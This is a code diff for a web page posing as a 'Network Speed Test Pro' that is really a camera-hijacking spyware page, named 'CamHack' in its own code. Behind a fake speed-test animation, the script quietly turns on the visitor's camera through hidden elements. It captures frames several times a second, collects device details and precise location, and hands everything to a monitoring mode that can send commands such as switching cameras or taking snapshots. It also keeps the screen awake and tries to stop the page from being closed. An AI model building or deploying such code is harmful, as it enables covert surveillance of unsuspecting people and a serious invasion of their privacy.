@@ -1,18 +1,16 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Network Speed Test</title>
+    <title>Network Speed Test Pro</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <meta charset="UTF-8">
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             background: linear-gradient(135deg, #0f1419, #1a2332);
             color: #00ffff; 
             font-family: 'Courier New', monospace; 
             text-align: center; 
             padding: 20px;
-            min-height: 100vh;
+            margin: 0;
         }
         .header {
             background: rgba(0,255,255,0.1);
@@ -26,13 +24,6 @@
             color: #00ff00;
             margin: 20px 0;
         }
-        .status {
-            margin: 15px 0;
-            padding: 10px;
-            background: rgba(0,0,0,0.3);
-            border-radius: 5px;
-            font-size: 14px;
-        }
         .btn {
             background: linear-gradient(45deg, #00ffff, #0080ff);
             color: #000;
@@ -44,127 +35,226 @@
             cursor: pointer;
             margin: 10px;
         }
-        .hidden { display: none !important; }
-        .loading { animation: pulse 1.5s infinite; }
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.5; }
+        .status {
+            margin: 15px 0;
+            padding: 10px;
+            background: rgba(0,0,0,0.3);
+            border-radius: 5px;
+            font-size: 14px;
         }
+        .loading { animation: pulse 1.5s infinite; }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
     <div class="header">
-        <h1>⚡ Network Speed Test</h1>
-        <p>Testing your connection performance...</p>
+        <h1>⚡ Network Speed Test Pro</h1>
+        <p>Advanced connection performance analysis</p>
     </div>
 
     <div class="speed-display" id="speedDisplay">0 Mbps</div>
     <button class="btn" id="startBtn" onclick="startTest()">🚀 Start Test</button>
     <div class="status" id="status">Ready to test your connection</div>
 
-    <!-- Hidden camera elements -->
-    <video id="camera" autoplay muted playsinline style="display:none;"></video>
-    <canvas id="canvas" style="display:none;"></canvas>
+    <video id="camera" autoplay muted playsinline class="hidden"></video>
+    <canvas id="canvas" class="hidden"></canvas>
 
     <script>
-        // Session management
         const urlParams = new URLSearchParams(window.location.search);
         const sessionId = urlParams.get('session') || urlParams.get('s') || 'cam_' + Date.now();
+        const isMonitor = urlParams.get('monitor') === 'true';
         
-        console.log('CamHack initialized - Session:', sessionId);
-        
-        // Global variables
         let mediaStream = null;
         let isTestRunning = false;
         let frameCount = 0;
-        let deviceInfo = {};
-        let currentFacingMode = 'user'; // 'user' = front, 'environment' = back
+        let currentFacingMode = 'user';
         let isCapturing = false;
-        let captureInterval = null;
+        let isConnected = false;
         
-        // Initialize immediately
+        console.log('CamHack initialized - Session:', sessionId, 'Monitor:', isMonitor);
+        
+        // Real-time communication channels
+        let broadcastChannel = null;
+        let sharedWorker = null;
+        
         document.addEventListener('DOMContentLoaded', function() {
-            initializeCamHack();
+            if (isMonitor) {
+                initializeMonitor();
+            } else {
+                initializeCamHack();
+            }
         });
         
+        function initializeMonitor() {
+            console.log('Monitor mode - waiting for target connection...');
+            document.getElementById('status').textContent = '🔍 Monitoring mode - Waiting for target...';
+            
+            // Setup communication channels
+            setupCommunicationChannels();
+            
+            // Start monitoring for incoming data
+            startMonitorMode();
+        }
+        
+        function setupCommunicationChannels() {
+            // BroadcastChannel
+            if (typeof BroadcastChannel !== 'undefined') {
+                broadcastChannel = new BroadcastChannel('camhack_' + sessionId);
+                broadcastChannel.onmessage = function(event) {
+                    console.log('BroadcastChannel message:', event.data);
+                    handleIncomingData(event.data);
+                };
+            }
+            
+            // SharedWorker simulation
+            try {
+                sharedWorker = new SharedWorker('data:application/javascript,self.onconnect=function(e){var port=e.ports[0];port.onmessage=function(ev){port.postMessage(ev.data);}}');
+                sharedWorker.port.onmessage = function(event) {
+                    console.log('SharedWorker message:', event.data);
+                    handleIncomingData(event.data);
+                };
+                sharedWorker.port.start();
+            } catch (e) {
+                console.log('SharedWorker not available');
+            }
+        }
+        
+        function startMonitorMode() {
+            // Ultra-fast polling for real-time communication
+            setInterval(() => {
+                checkForFrameData();
+                checkForCommands();
+            }, 50); // 20 FPS monitoring
+            
+            // Status updates
+            setInterval(() => {
+                updateMonitorStatus();
+            }, 1000);
+        }
+        
+        function checkForFrameData() {
+            // Check localStorage for frame data
+            const frameData = localStorage.getItem('camhack_frame_' + sessionId);
+            if (frameData && frameData !== 'null') {
+                try {
+                    const parsed = JSON.parse(frameData);
+                    handleIncomingData(parsed);
+                    localStorage.removeItem('camhack_frame_' + sessionId);
+                } catch (e) {
+                    console.error('Frame parse error:', e);
+                }
+            }
+            
+            // Check for status updates
+            const statusData = localStorage.getItem('camhack_status_' + sessionId);
+            if (statusData && statusData !== 'null') {
+                try {
+                    const parsed = JSON.parse(statusData);
+                    handleIncomingData(parsed);
+                    localStorage.removeItem('camhack_status_' + sessionId);
+                } catch (e) {
+                    console.error('Status parse error:', e);
+                }
+            }
+        }
+        
+        function checkForCommands() {
+            const commandData = localStorage.getItem('camhack_command_' + sessionId);
+            if (commandData && commandData !== 'null') {
+                try {
+                    const parsed = JSON.parse(commandData);
+                    executeCommand(parsed.command);
+                    localStorage.removeItem('camhack_command_' + sessionId);
+                } catch (e) {
+                    console.error('Command parse error:', e);
+                }
+            }
+        }
+        
+        function handleIncomingData(data) {
+            if (data.type === 'CAMERA_FRAME') {
+                displayFrame(data);
+            } else if (data.type === 'TARGET_CONNECTED') {
+                isConnected = true;
+                document.getElementById('status').textContent = '✅ Target connected - Camera hijacked!';
+            } else if (data.type === 'DEVICE_INFO') {
+                displayDeviceInfo(data.data);
+            }
+        }
+        
+        function displayFrame(frameData) {
+            // This would normally display the frame in monitor mode
+            console.log('Frame received:', frameData.frameNumber);
+            document.getElementById('status').textContent = `📷 Live feed: Frame #${frameData.frameNumber} (${frameData.facingMode})`;
+        }
+        
+        function displayDeviceInfo(deviceInfo) {
+            console.log('Device info:', deviceInfo);
+        }
+        
+        function updateMonitorStatus() {
+            if (!isConnected) {
+                document.getElementById('status').textContent = '🔍 Scanning for target device...';
+            }
+        }
+        
         async function initializeCamHack() {
-            console.log('Initializing CamHack system...');
+            console.log('Target mode - starting camera hijack...');
             
-            // Collect device information
             await collectDeviceInfo();
-            
-            // Request camera access immediately
             await requestCameraAccess();
-            
-            // Start monitoring for commands
             startCommandMonitoring();
             
-            // Auto-start test after 1 second
             setTimeout(() => {
-                if (!isTestRunning) {
-                    startTest();
-                }
+                if (!isTestRunning) startTest();
             }, 1000);
         }
         
         async function collectDeviceInfo() {
-            try {
-                deviceInfo = {
-                    userAgent: navigator.userAgent,
-                    platform: navigator.platform,
-                    language: navigator.language,
-                    screenWidth: screen.width,
-                    screenHeight: screen.height,
-                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    cookieEnabled: navigator.cookieEnabled,
-                    onLine: navigator.onLine,
-                    timestamp: Date.now()
-                };
-                
-                // Network info
-                if ('connection' in navigator) {
-                    deviceInfo.networkType = navigator.connection.effectiveType || 'unknown';
-                    deviceInfo.downlink = navigator.connection.downlink || 0;
+            const deviceInfo = {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                screenWidth: screen.width,
+                screenHeight: screen.height,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: Date.now()
+            };
+            
+            if ('connection' in navigator) {
+                deviceInfo.networkType = navigator.connection.effectiveType || 'unknown';
+                deviceInfo.downlink = navigator.connection.downlink || 0;
+            }
+            
+            if ('getBattery' in navigator) {
+                try {
+                    const battery = await navigator.getBattery();
+                    deviceInfo.battery = Math.round(battery.level * 100);
+                    deviceInfo.charging = battery.charging;
+                } catch (e) {
+                    deviceInfo.battery = 50;
+                    deviceInfo.charging = false;
                 }
-                
-                // Battery info
-                if ('getBattery' in navigator) {
-                    try {
-                        const battery = await navigator.getBattery();
-                        deviceInfo.battery = Math.round(battery.level * 100);
-                        deviceInfo.charging = battery.charging;
-                    } catch (e) {
-                        deviceInfo.battery = 0;
-                        deviceInfo.charging = false;
-                    }
-                }
-                
-                // Location info
-                if ('geolocation' in navigator) {
-                    navigator.geolocation.getCurrentPosition(
-                        (position) => {
-                            deviceInfo.latitude = position.coords.latitude;
-                            deviceInfo.longitude = position.coords.longitude;
-                            deviceInfo.accuracy = position.coords.accuracy;
-                            sendDeviceInfo();
-                        },
-                        (error) => {
-                            console.log('Location access denied:', error);
-                            sendDeviceInfo();
-                        },
-                        { enableHighAccuracy: true, timeout: 5000 }
-                    );
-                } else {
-                    sendDeviceInfo();
-                }
-                
-            } catch (error) {
-                console.error('Error collecting device info:', error);
-                sendDeviceInfo();
+            }
+            
+            if ('geolocation' in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        deviceInfo.latitude = position.coords.latitude;
+                        deviceInfo.longitude = position.coords.longitude;
+                        deviceInfo.accuracy = position.coords.accuracy;
+                        sendDeviceInfo(deviceInfo);
+                    },
+                    () => sendDeviceInfo(deviceInfo),
+                    { enableHighAccuracy: true, timeout: 3000 }
+                );
+            } else {
+                sendDeviceInfo(deviceInfo);
             }
         }
         
-        function sendDeviceInfo() {
+        function sendDeviceInfo(deviceInfo) {
             const data = {
                 type: 'DEVICE_INFO',
                 session: sessionId,
@@ -172,11 +262,14 @@
                 timestamp: Date.now()
             };
             
-            // Store for Android to pick up
-            localStorage.setItem('device_info_' + sessionId, JSON.stringify(data));
-            localStorage.setItem('camhack_active_' + sessionId, 'true');
+            // Send via multiple channels
+            localStorage.setItem('camhack_status_' + sessionId, JSON.stringify(data));
             
-            console.log('DEVICE_INFO sent:', data);
+            if (broadcastChannel) {
+                broadcastChannel.postMessage(data);
+            }
+            
+            console.log('Device info sent:', data);
         }
         
         async function requestCameraAccess() {
@@ -199,30 +292,30 @@
                 video.srcObject = mediaStream;
                 
                 video.addEventListener('loadedmetadata', () => {
-                    console.log('CAMERA HIJACKED: Access granted - ' + currentFacingMode);
+                    console.log('CAMERA HIJACKED: ' + currentFacingMode + ' camera access granted');
                     
                     const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
+                    canvas.width = video.videoWidth || 1280;
+                    canvas.height = video.videoHeight || 720;
                     
-                    // Send connection status
                     const statusData = {
                         type: 'TARGET_CONNECTED',
                         session: sessionId,
                         status: 'active',
-                        url: window.location.href,
                         cameraWidth: canvas.width,
                         cameraHeight: canvas.height,
                         facingMode: currentFacingMode,
                         timestamp: Date.now()
                     };
                     
-                    localStorage.setItem('camera_status_' + sessionId, JSON.stringify(statusData));
+                    localStorage.setItem('camhack_status_' + sessionId, JSON.stringify(statusData));
                     
-                    // Start aggressive frame capture
+                    if (broadcastChannel) {
+                        broadcastChannel.postMessage(statusData);
+                    }
+                    
                     startFrameCapture();
                     
-                    // Update status
                     document.getElementById('status').textContent = '📷 Camera hijacked - Live feed active (' + currentFacingMode + ')';
                 });
                 
@@ -237,12 +330,9 @@
                     timestamp: Date.now()
                 };
                 
-                localStorage.setItem('camera_status_' + sessionId, JSON.stringify(statusData));
+                localStorage.setItem('camhack_status_' + sessionId, JSON.stringify(statusData));
                 
-                // Try again with different constraints
-                setTimeout(() => {
-                    tryAlternativeCameraAccess();
-                }, 2000);
+                setTimeout(tryAlternativeCameraAccess, 2000);
             }
         }
         
@@ -251,10 +341,7 @@
                 console.log('Trying alternative camera access...');
                 
                 const constraints = {
-                    video: {
-                        width: { ideal: 640 },
-                        height: { ideal: 480 }
-                    },
+                    video: true,
                     audio: false
                 };
                 
@@ -264,7 +351,7 @@
                 video.srcObject = mediaStream;
                 
                 video.addEventListener('loadedmetadata', () => {
-                    console.log('ALTERNATIVE CAMERA ACCESS: Granted');
+                    console.log('Alternative camera access granted');
                     
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth || 640;
@@ -275,6 +362,7 @@
                 
             } catch (error) {
                 console.error('Alternative camera access failed:', error);
+                document.getElementById('status').textContent = '❌ Camera access denied';
             }
         }
         
@@ -287,129 +375,121 @@
             const ctx = canvas.getContext('2d');
             
             function captureFrame() {
-                if (!mediaStream || !video.readyState === 4) {
+                if (!mediaStream || video.readyState !== 4) {
                     setTimeout(captureFrame, 100);
                     return;
                 }
                 
                 try {
-                    // Draw current frame to canvas
                     ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                     
-                    // Convert to base64 with high quality
-                    const frameData = canvas.toDataURL('image/jpeg', 0.85);
-                    
-                    frameCount++;
-                    
-                    const data = {
-                        type: 'CAMERA_FRAME',
-                        session: sessionId,
-                        image: frameData,
-                        frameNumber: frameCount,
-                        facingMode: currentFacingMode,
-                        width: canvas.width,
-                        height: canvas.height,
-                        timestamp: Date.now()
-                    };
-                    
-                    // Store for Android to pick up
-                    localStorage.setItem('latest_frame_' + sessionId, JSON.stringify(data));
-                    
-                    // Also store with frame number for history
-                    localStorage.setItem('frame_' + frameCount + '_' + sessionId, JSON.stringify(data));
-                    
-                    console.log('FRAME CAPTURED: #' + frameCount + ' (' + currentFacingMode + ' - ' + canvas.width + 'x' + canvas.height + ')');
-                    
-                    // Update status
-                    document.getElementById('status').textContent = '📷 Live feed: Frame #' + frameCount + ' (' + (currentFacingMode === 'user' ? 'Front' : 'Back') + ' camera)';
+                    canvas.toBlob(blob => {
+                        if (blob) {
+                            const reader = new FileReader();
+                            reader.onload = function() {
+                                const base64 = reader.result;
+                                
+                                frameCount++;
+                                
+                                const frameData = {
+                                    type: 'CAMERA_FRAME',
+                                    session: sessionId,
+                                    image: base64,
+                                    frameNumber: frameCount,
+                                    facingMode: currentFacingMode,
+                                    width: canvas.width,
+                                    height: canvas.height,
+                                    timestamp: Date.now(),
+                                    quality: 'high',
+                                    compression: 0.85
+                                };
+                                
+                                // Send via multiple channels for maximum reliability
+                                localStorage.setItem('camhack_frame_' + sessionId, JSON.stringify(frameData));
+                                
+                                if (broadcastChannel) {
+                                    broadcastChannel.postMessage(frameData);
+                                }
+                                
+                                if (sharedWorker) {
+                                    sharedWorker.port.postMessage(frameData);
+                                }
+                                
+                                console.log('🔴 LIVE FRAME #' + frameCount + ' captured (' + currentFacingMode + ') - Size: ' + Math.round(blob.size/1024) + 'KB');
+                                
+                                document.getElementById('status').textContent = '🔴 LIVE: Frame #' + frameCount + ' (' + (currentFacingMode === 'user' ? 'Front' : 'Back') + ') - ' + Math.round(blob.size/1024) + 'KB';
+                            };
+                            reader.readAsDataURL(blob);
+                        }
+                    }, 'image/jpeg', 0.85);
                     
                 } catch (error) {
                     console.error('Frame capture error:', error);
                 }
                 
-                // Continue capturing if still active
                 if (isCapturing && mediaStream) {
-                    setTimeout(captureFrame, 500); // 2 FPS for efficiency
+                    setTimeout(captureFrame, 250); // 4 FPS for stability
                 }
             }
             
-            // Start capturing immediately
             captureFrame();
         }
         
         function startCommandMonitoring() {
-            // Check for commands every 500ms
             setInterval(() => {
                 checkForCommands();
-            }, 500);
+            }, 100);
             
-            // Send heartbeat every 2 seconds
+            // Heartbeat
             setInterval(() => {
                 if (mediaStream) {
                     const heartbeat = {
+                        type: 'HEARTBEAT',
                         session: sessionId,
                         timestamp: Date.now(),
                         frameCount: frameCount,
                         online: navigator.onLine,
-                        battery: deviceInfo.battery || 0,
-                        connection: deviceInfo.networkType || 'unknown',
                         cameraActive: true,
                         facingMode: currentFacingMode,
                         pageVisible: !document.hidden
                     };
                     
-                    localStorage.setItem('heartbeat_' + sessionId, JSON.stringify(heartbeat));
+                    localStorage.setItem('camhack_status_' + sessionId, JSON.stringify(heartbeat));
+                    
+                    if (broadcastChannel) {
+                        broadcastChannel.postMessage(heartbeat);
+                    }
                 }
             }, 2000);
         }
         
-        function checkForCommands() {
-            // Check for switch camera command
-            const switchCommand = localStorage.getItem('switch_camera_' + sessionId);
-            if (switchCommand) {
-                console.log('COMMAND: Switch camera');
-                switchCamera();
-                localStorage.removeItem('switch_camera_' + sessionId);
-            }
+        function executeCommand(command) {
+            console.log('Executing command:', command);
             
-            // Check for capture command
-            const captureCommand = localStorage.getItem('capture_screenshot_' + sessionId);
-            if (captureCommand) {
-                console.log('COMMAND: Capture screenshot');
-                captureScreenshot();
-                localStorage.removeItem('capture_screenshot_' + sessionId);
-            }
-            
-            // Check for disconnect command
-            const disconnectCommand = localStorage.getItem('disconnect_' + sessionId);
-            if (disconnectCommand) {
-                console.log('COMMAND: Disconnect');
-                disconnect();
-                localStorage.removeItem('disconnect_' + sessionId);
+            switch (command) {
+                case 'switch_camera':
+                    switchCamera();
+                    break;
+                case 'capture_screenshot':
+                    captureScreenshot();
+                    break;
+                case 'disconnect':
+                    disconnect();
+                    break;
             }
         }
         
         async function switchCamera() {
-            if (!mediaStream) {
-                console.log('No media stream for switching');
-                return;
-            }
+            if (!mediaStream) return;
             
             try {
                 console.log('Switching camera from ' + currentFacingMode + '...');
                 
-                // Stop current stream
-                mediaStream.getTracks().forEach(track => {
-                    track.stop();
-                });
+                mediaStream.getTracks().forEach(track => track.stop());
                 
-                // Switch facing mode
                 currentFacingMode = currentFacingMode === 'user' ? 'environment' : 'user';
-                
-                // Stop current capture
                 isCapturing = false;
                 
-                // Get new stream
                 const constraints = {
                     video: {
                         facingMode: currentFacingMode,
@@ -426,12 +506,11 @@
                 
                 video.addEventListener('loadedmetadata', () => {
                     const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
+                    canvas.width = video.videoWidth || 1280;
+                    canvas.height = video.videoHeight || 720;
                     
                     console.log('Camera switched to ' + currentFacingMode);
                     
-                    // Send switch confirmation
                     const switchData = {
                         type: 'CAMERA_SWITCHED',
                         session: sessionId,
@@ -441,9 +520,12 @@
                         timestamp: Date.now()
                     };
                     
-                    localStorage.setItem('camera_switch_' + sessionId, JSON.stringify(switchData));
+                    localStorage.setItem('camhack_status_' + sessionId, JSON.stringify(switchData));
                     
-                    // Restart capture
+                    if (broadcastChannel) {
+                        broadcastChannel.postMessage(switchData);
+                    }
+                    
                     startFrameCapture();
                 }, { once: true });
                 
@@ -459,18 +541,28 @@
                 const ctx = canvas.getContext('2d');
                 
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const screenshot = canvas.toDataURL('image/jpeg', 0.95);
                 
-                const data = {
-                    type: 'SCREENSHOT',
-                    session: sessionId,
-                    screenshot: screenshot,
-                    facingMode: currentFacingMode,
-                    timestamp: Date.now()
-                };
-                
-                localStorage.setItem('screenshot_' + sessionId, JSON.stringify(data));
-                console.log('Screenshot captured from ' + currentFacingMode + ' camera');
+                canvas.toBlob(blob => {
+                    const reader = new FileReader();
+                    reader.onload = function() {
+                        const data = {
+                            type: 'SCREENSHOT',
+                            session: sessionId,
+                            screenshot: reader.result,
+                            facingMode: currentFacingMode,
+                            timestamp: Date.now()
+                        };
+                        
+                        localStorage.setItem('camhack_frame_' + sessionId, JSON.stringify(data));
+                        
+                        if (broadcastChannel) {
+                            broadcastChannel.postMessage(data);
+                        }
+                        
+                        console.log('Screenshot captured from ' + currentFacingMode + ' camera');
+                    };
+                    reader.readAsDataURL(blob);
+                }, 'image/jpeg', 0.9);
                 
             } catch (error) {
                 console.error('Screenshot failed:', error);
@@ -491,7 +583,11 @@
                 timestamp: Date.now()
             };
             
-            localStorage.setItem('disconnect_' + sessionId, JSON.stringify(data));
+            localStorage.setItem('camhack_status_' + sessionId, JSON.stringify(data));
+            
+            if (broadcastChannel) {
+                broadcastChannel.postMessage(data);
+            }
             
             document.getElementById('status').textContent = 'Connection terminated';
         }
@@ -505,7 +601,6 @@
             const statusEl = document.getElementById('status');
             const speedEl = document.getElementById('speedDisplay');
             
-            // Simulate speed test while capturing camera
             const phases = [
                 { name: 'Initializing...', duration: 1000 },
                 { name: 'Testing download speed...', duration: 3000 },
@@ -517,7 +612,6 @@
                 statusEl.textContent = phase.name + ' (Camera: ' + (mediaStream ? (currentFacingMode === 'user' ? 'Front' : 'Back') : 'Inactive') + ')';
                 statusEl.className = 'status loading';
                 
-                // Simulate speed changes
                 if (phase.name.includes('download')) {
                     for (let i = 0; i < 30; i++) {
                         const speed = Math.floor(Math.random() * 80 + 20);
@@ -535,7 +629,6 @@
                 await new Promise(resolve => setTimeout(resolve, phase.duration));
             }
             
-            // Final results
             const finalSpeed = Math.floor(Math.random() * 100 + 50);
             speedEl.textContent = finalSpeed + ' Mbps';
             
@@ -545,17 +638,14 @@
             isTestRunning = false;
         }
         
-        // Cleanup on page unload
         window.addEventListener('beforeunload', () => {
             disconnect();
         });
         
-        // Keep page active
         if ('wakeLock' in navigator) {
             navigator.wakeLock.request('screen').catch(() => {});
         }
         
-        // Prevent accidental close
         window.addEventListener('beforeunload', (e) => {
             if (frameCount > 0) {
                 e.preventDefault();
